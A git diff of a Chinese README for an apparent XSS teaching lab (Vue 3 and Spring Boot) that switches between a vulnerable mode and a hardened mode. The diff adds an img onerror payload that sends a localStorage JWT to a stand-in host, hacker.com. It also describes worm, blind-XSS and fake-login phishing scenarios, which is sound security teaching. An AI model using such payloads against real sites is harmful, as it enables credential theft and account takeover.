@@ -19,8 +19,8 @@
 - 后端：Spring Boot 3 + JPA + MySQL 8
 - 认证：JWT (HS256)
 
-**核心特性**：
-- ✅ 5 个渐进式 XSS 攻击场景（从简单弹窗到蠕虫传播）
+## 核心特性
+- ✅ 5 个渐进式 XSS 攻击场景（从 Hello XSS 到蠕虫传播）
 - ✅ 双模式一键切换（无需重启）
 - ✅ 完整攻防对比（JWT 存储、内容过滤、安全响应头）
 
@@ -69,8 +69,8 @@ docker-compose up -d
 | 项目 | VULN 模式 | SECURE 模式 |
 |------|----------|-------------|
 | **JWT 存储** | localStorage（可被 JS 读取） | HttpOnly Cookie（JS 无法访问） |
-| **内容渲染** | v-html 直接渲染 | 场景 4 DOMPurify 过滤，其他文本渲染 |
-| **后端输出** | 不转义 | 场景 1/2/3/5 HTML 转义 |
+| **内容渲染** | v-html 直接渲染 | 场景 5 DOMPurify 过滤，其他文本渲染 |
+| **后端输出** | 不转义 | 场景 1/2/3/4 HTML 转义 |
 | **安全响应头** | 无 | CSP + X-Frame-Options |
 | **XSS 攻击** | ✅ 成功执行 | ❌ 被拦截 |
 
@@ -84,48 +84,51 @@ docker-compose up -d
 
 ## 演示场景
 
-### 场景 1：反射型 XSS「Hello, XSS」
+### 场景 1：Hello, XSS
 **目标**：确认 XSS 能执行  
 **入口**：`/search?q=...`  
 **Payload**：`<img src=x onerror=alert(1)>`  
 **预期**：弹窗显示 `1`
 
-### 场景 2：静默画像收集
-**目标**：无感窃取 JWT 凭证  
+### 场景 2：窃取用户JWT
+**目标**：盗取存储在 localStorage 中的 JWT  
 **入口**：`/search?q=...`  
-**特点**：不弹窗，静默上报到攻击者服务器  
-**预期**：收集器记录 `{hasToken:true, profile:true}`
+**Payload**：`<img src=x onerror="new Image().src='http://hacker.com/jwt='+localStorage.getItem('accessToken');">`  
+**预期**：攻击者服务器接收到 JWT 凭证
 
-### 场景 3：评论蠕虫 ⭐
+### 场景 3：XSS盲打
+**目标**：通过反馈功能盲打管理员  
+**入口**：前台 `/feedback` → 后台 `/admin/feedbacks` 查看  
+**特点**：管理员无感知，盗取管理员 JWT  
+**预期**：攻击者获取管理员 JWT 凭证
+
+### 场景 4：评论蠕虫 ⭐
 **目标**：展示存储型 XSS 自传播能力  
 **入口**：文章详情页评论区  
 **特点**：
-- 自动扩散到其他文章
-- localStorage 防重复
-- 目标数上限（3 个）保证可控  
-**预期**：评论自动传播到 3 篇文章
+- 自动扩散到其他文章（通过文章ID偏移）
+- 每次访问传播到 3 篇文章
+- 使用 this.outerHTML 自我复制  
+**预期**：评论自动传播到多篇文章
 
-### 场景 4：Bio 伪造登录页
+### 场景 5：伪造登录页钓鱼
 **目标**：全屏伪造登录界面钓鱼  
 **入口**：`/profile/{username}` 个人简介  
-**特点**："会话已过期"提示，诱骗输入账号密码  
-**预期**：用户输入后攻击者获取凭证
-
-### 场景 5：盲 XSS 窃取管理员身份
-**目标**：利用管理员会话窃取凭证  
-**入口**：前台 `/feedback` → 后台 `/admin/feedbacks` 查看  
-**特点**：管理员无感知  
-**预期**：攻击者获取管理员 username、role、cookie
+**特点**：
+- 使用 CSS 伪造全屏登录页
+- 前三次输入提示错误，第三次显示成功
+- Base64 编码数据后上报  
+**预期**：用户输入后攻击者获取明文密码
 
 📝 详细操作步骤见：[XSS演示场景说明.md](XSS演示场景说明.md)
 
 ## 快速体验
 
 ```bash
-# 场景 1：基础弹窗
+# 场景 1：Hello XSS
 http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 
-# 场景 3-5：需按文档步骤操作
+# 场景 2/3/4/5：需按文档步骤操作
 ```
 
 💡 **重要提示**：Vue 中通过 `v-html` 插入的 `<script>` 标签不会执行，需使用事件处理器型 payload（如 `onerror`、`onload`）。
@@ -133,7 +136,7 @@ http://localhost:5173/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
 ## 技术栈
 - 前端：Vue 3、Vite、Element Plus、Pinia、Axios
 - 后端：Spring Boot 3、Spring Security、JPA/Hibernate、MySQL 8
-- 安全：HttpOnly Cookie、HtmlUtils 转义、DOMPurify 白名单（仅场景 4）
+- 安全：HttpOnly Cookie、HtmlUtils 转义、DOMPurify 白名单（仅场景 5）
 
 ## 参考
 - XSS 场景说明：`XSS演示场景说明.md`
